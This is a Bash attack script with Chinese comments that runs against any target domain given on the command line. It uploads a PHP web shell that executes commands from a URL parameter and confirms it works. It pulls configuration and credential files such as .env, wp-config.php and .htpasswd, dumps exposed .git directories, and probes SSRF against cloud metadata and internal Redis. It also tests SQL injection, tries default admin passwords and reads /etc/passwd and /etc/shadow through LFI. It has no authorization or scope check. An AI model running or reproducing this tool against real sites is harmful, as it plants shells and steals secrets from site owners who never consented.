#!/bin/bash
# 手动深度测试脚本 - 逐个目标深入

TARGET="$1"
OUT_DIR="/root/manual_test/results"
mkdir -p "$OUT_DIR"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 深度测试: $TARGET"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 标准化URL
if [[ ! "$TARGET" =~ ^https?:// ]]; then
    TARGET="https://$TARGET"
fi
DOMAIN=$(echo "$TARGET" | sed 's|^https\?://||' | cut -d/ -f1 | cut -d: -f1)
FLAG=$(echo "$TARGET" | md5sum | cut -c1-8)

RESULT_FILE="$OUT_DIR/${DOMAIN}_shells.txt"
> "$RESULT_FILE"

echo "[1/8] 📤 文件上传测试..."
for path in /upload /upload.php /fileupload /api/upload /api/file/upload /admin/upload /wp-admin/async-upload.php /wp-content/uploads /includes/upload.php /modules/upload.php; do
    for ext in php phtml php5; do
        tmp_file="/tmp/u_${FLAG}_${ext}"
        printf '%s\n' "<?php echo \"U${FLAG}\";@system(\$_GET[0]); ?>" > "$tmp_file"
        
        # POST multipart
        resp=$(curl -skL -m 10 -X POST "$TARGET$path" \
            -F "file=@$tmp_file" \
            -F "upload=@$tmp_file" \
            -F "fileupload=@$tmp_file" \
            -F "image=@$tmp_file" \
            -F "fileType=Photo" \
            -H "User-Agent: Mozilla/5.0" 2>&1)
        
        # 提取返回的shell路径
        echo "$resp" | grep -oE "(http[s]?://[^\"' ]+\.(php|phtml|php5|aspx|jsp))" | while read shell_url; do
            test_resp=$(curl -skL -m 5 "${shell_url}?0=echo%20${FLAG}" 2>/dev/null)
            if echo "$test_resp" | grep -q "${FLAG}"; then
                echo "[✅ 文件上传成功] $shell_url" | tee -a "$RESULT_FILE"
            fi
        done
        
        # 检查响应中的路径
        echo "$resp" | grep -oE "(uploads/[^\"' ]+\.${ext}|files/[^\"' ]+\.${ext})" | while read rel_path; do
            test_url="${TARGET}/${rel_path}"
            test_resp=$(curl -skL -m 5 "${test_url}?0=echo%20${FLAG}" 2>/dev/null)
            if echo "$test_resp" | grep -q "${FLAG}"; then
                echo "[✅ 文件上传成功] $test_url" | tee -a "$RESULT_FILE"
            fi
        done
    done
done
rm -f /tmp/u_${FLAG}_*

echo "[2/8] 🔓 敏感文件泄露..."
for file in .env .env.local .env.production config.php wp-config.php configuration.php database.yml application.properties web.config .git/config .git/HEAD .DS_Store .htaccess .htpasswd; do
    resp=$(curl -skL -m 5 "$TARGET/$file" 2>/dev/null)
    if [ ${#resp} -gt 50 ] && echo "$resp" | grep -qiE "password|secret|api[_-]?key|db[_-]?pass|mysql|database"; then
        echo "[✅ 敏感文件泄露] $TARGET/$file" | tee -a "$RESULT_FILE"
        echo "$resp" | head -20 >> "$RESULT_FILE"
    fi
done

echo "[3/8] 🔌 未授权API测试..."
for api in /api/users /api/admin /api/data /api/config /api/system /api/info /api/status /api/version /api/test /api/debug; do
    resp=$(curl -skL -m 5 "$TARGET$api" 2>/dev/null)
    if [ ${#resp} -gt 10 ] && echo "$resp" | grep -qE "\{|\["; then
        if ! echo "$resp" | grep -qiE "login|unauthorized|forbidden|401|403"; then
            echo "[✅ 未授权API] $TARGET$api" | tee -a "$RESULT_FILE"
        fi
    fi
done

echo "[4/8] 🗄️ Git泄露测试..."
for git_path in .git/config .git/HEAD .git/index .git/logs/HEAD .git/objects/info/packs; do
    resp=$(curl -skL -m 5 "$TARGET/$git_path" 2>/dev/null)
    if echo "$resp" | grep -qE "\[core\]|ref:|commit|pack-"; then
        echo "[✅ Git泄露] $TARGET/$git_path" | tee -a "$RESULT_FILE"
        # 尝试下载整个.git
        git_dump_dir="/tmp/git_${FLAG}"
        mkdir -p "$git_dump_dir"
        cd "$git_dump_dir"
        wget -r -np -k -q "$TARGET/.git/" 2>/dev/null && echo "  → .git目录已下载到 $git_dump_dir" | tee -a "$RESULT_FILE"
    fi
done

echo "[5/8] 🌐 SSRF测试..."
for ssrf_path in /api/fetch /api/proxy /api/download /api/curl /api/file /api/url; do
    # AWS元数据
    resp=$(curl -skL -m 5 "$TARGET${ssrf_path}?url=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
    if echo "$resp" | grep -qiE "instance-id|ami-id|access"; then
        echo "[✅ SSRF成功] $TARGET${ssrf_path}" | tee -a "$RESULT_FILE"
    fi
    
    # 内网Redis
    resp=$(curl -skL -m 5 "$TARGET${ssrf_path}?url=http://127.0.0.1:6379" 2>/dev/null)
    if echo "$resp" | grep -qE "REDIS|PONG|OK"; then
        echo "[✅ SSRF Redis] $TARGET${ssrf_path}" | tee -a "$RESULT_FILE"
    fi
done

echo "[6/8] 💉 SQL注入测试..."
# 提取URL参数
params=$(echo "$TARGET" | grep -oE "[?&][a-zA-Z0-9_]+=" | sed 's/[?&]//g' | sed 's/=//g' | sort -u)
if [ -z "$params" ]; then
    params="id user page cat"
fi

for param in $params; do
    # 错误注入
    resp=$(curl -skL -m 5 "$TARGET?${param}=1'" 2>/dev/null)
    if echo "$resp" | grep -qiE "mysql|postgresql|sql syntax|sql error|warning.*mysql"; then
        echo "[✅ SQL注入] $TARGET?${param}=1'" | tee -a "$RESULT_FILE"
    fi
    
    # 布尔盲注
    resp1=$(curl -skL -m 5 "$TARGET?${param}=1' AND '1'='1" 2>/dev/null)
    resp2=$(curl -skL -m 5 "$TARGET?${param}=1' AND '1'='2" 2>/dev/null)
    if [ "$resp1" != "$resp2" ] && [ ${#resp1} -gt 10 ]; then
        echo "[✅ SQL布尔盲注] $TARGET?${param}" | tee -a "$RESULT_FILE"
    fi
done

echo "[7/8] 🔑 弱口令测试..."
for login_path in /admin /wp-admin /wp-login.php /administrator /login /admin/login /cpanel /phpmyadmin; do
    # WordPress
    if echo "$TARGET" | grep -q "wp-login"; then
        for cred in "admin:admin" "admin:123456" "admin:password" "root:root"; do
            user=$(echo $cred | cut -d: -f1)
            pass=$(echo $cred | cut -d: -f2)
            resp=$(curl -skL -m 5 -X POST "$TARGET$login_path" \
                -d "log=$user&pwd=$pass&wp-submit=Log+In" \
                -H "Cookie: wordpress_test_cookie=WP+Cookie+check" 2>/dev/null)
            if echo "$resp" | grep -qiE "dashboard|wp-admin|logout"; then
                echo "[✅ WordPress弱口令] $TARGET$login_path ($user:$pass)" | tee -a "$RESULT_FILE"
            fi
        done
    fi
    
    # 通用登录
    for cred in "admin:admin" "admin:123456" "root:root" "administrator:password"; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        resp=$(curl -skL -m 5 -X POST "$TARGET$login_path" \
            -d "username=$user&password=$pass" \
            -d "user=$user&pass=$pass" \
            -d "login=$user&pwd=$pass" 2>/dev/null)
        if echo "$resp" | grep -qiE "dashboard|welcome|logout|success" && ! echo "$resp" | grep -qiE "error|invalid|failed"; then
            echo "[✅ 弱口令] $TARGET$login_path ($user:$pass)" | tee -a "$RESULT_FILE"
        fi
    done
done

echo "[8/8] 📁 任意文件读取/LFI..."
for param in file path page include view template; do
    # 常见路径
    for lfi_path in /etc/passwd /etc/hosts /proc/version /windows/win.ini /etc/shadow; do
        resp=$(curl -skL -m 5 "$TARGET?${param}=$lfi_path" 2>/dev/null)
        if echo "$resp" | grep -qE "root:.*:0:0:|\[fonts\]|Linux version"; then
            echo "[✅ LFI成功] $TARGET?${param}=$lfi_path" | tee -a "$RESULT_FILE"
        fi
    done
    
    # 路径遍历
    resp=$(curl -skL -m 5 "$TARGET?${param}=../../../../etc/passwd" 2>/dev/null)
    if echo "$resp" | grep -qE "root:.*:0:0:"; then
        echo "[✅ LFI路径遍历] $TARGET?${param}" | tee -a "$RESULT_FILE"
    fi
done

shell_count=$(wc -l < "$RESULT_FILE" 2>/dev/null || echo 0)
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ $DOMAIN 测试完成，发现 $shell_count 个结果"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
if [ "$shell_count" -gt 0 ]; then
    cat "$RESULT_FILE"
fi
